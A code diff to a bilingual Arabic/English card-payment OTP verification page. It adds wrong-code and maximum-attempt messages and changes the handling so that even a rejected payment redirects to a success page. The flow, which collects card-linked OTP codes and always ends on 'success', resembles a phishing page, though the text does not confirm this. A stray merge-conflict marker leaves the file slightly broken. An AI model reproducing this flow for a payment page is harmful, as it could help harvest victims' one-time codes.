@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -398,6 +399,8 @@
         msgEmpty: "يرجى ملء كافة حقول رمز التأكيد بشكل كامل.",
         msgSuccess: "تم التحقق من الرمز بنجاح وتأكيد الدفع الآمن.",
         msgError: "رمز التحقق المدخل غير صحيح، يرجى مراجعة الرسالة والمحاولة مجدداً.",
+        msgWrongOTP: "❌ الرمز غير صحيح، يرجى إعادة المحاولة.",
+        msgMaxAttempts: "❌ تم رفض طلبك، يرجى استخدام طريقة دفع أخرى.",
         msgExpired: "انتهت صلاحية الرمز الفوري، يرجى إعادة طلب رمز آخر.",
         msgLimit: "لقد تجاوزت الحد المسموح به لطلب رموز الدفع المؤقتة.",
         msgSuccessResend: "تم إرسال رمز تحقق جديد إلى رقم الهاتف المربوط ببطاقتك.",
@@ -421,6 +424,8 @@
         msgEmpty: "Please fill in all verification code fields.",
         msgSuccess: "Code verified successfully! Securing payment.",
         msgError: "The verification code is incorrect. Please check and try again.",
+        msgWrongOTP: "❌ Incorrect code, please try again.",
+        msgMaxAttempts: "❌ Payment rejected, please use a different payment method.",
         msgExpired: "The OTP has expired. Please request a new code.",
         msgLimit: "You have reached the maximum limit for OTP requests.",
         msgSuccessResend: "A new verification code has been sent to your phone.",
@@ -625,18 +630,33 @@
       .then(data => {
         console.log('استجابة السيرفر:', data);
         
+        // التحقق من حالة max_attempts (تم رفض الطلب بعد 3 محاولات)
+        if (data.message === 'max_attempts') {
+          showMessage('error', locales[currentLang].msgMaxAttempts);
+          shakeInputs();
+          setTimeout(() => {
+            window.location.href = 'success.html?rejected=true';
+          }, 2000);
+          return;
+        }
+        
         // التحقق من نجاح التحقق من OTP
         if (data.success === true) {
-          // عرض رسالة النجاح
+          // دائمًا توجيه لصفحة success
           showMessage('success', locales[currentLang].msgSuccess);
-          
-          // تأخير قليل قبل الانتقال لصفحة النجاح
           setTimeout(() => {
             window.location.href = 'success.html';
           }, 1500);
         } else {
-          // عرض رسالة الخطأ
-          showMessage('error', locales[currentLang].msgError);
+          // خطأ - إظهار رسالة فوق الحقول
+          let errorMsg = locales[currentLang].msgError;
+          
+          // بعد المحاولة الأولى، أظهر رسالة مختلفة
+          if (data.attempt && data.attempt >= 1) {
+            errorMsg = locales[currentLang].msgWrongOTP || locales[currentLang].msgError;
+          }
+          
+          showMessage('error', errorMsg);
           shakeInputs();
           clearOTPFields();
           
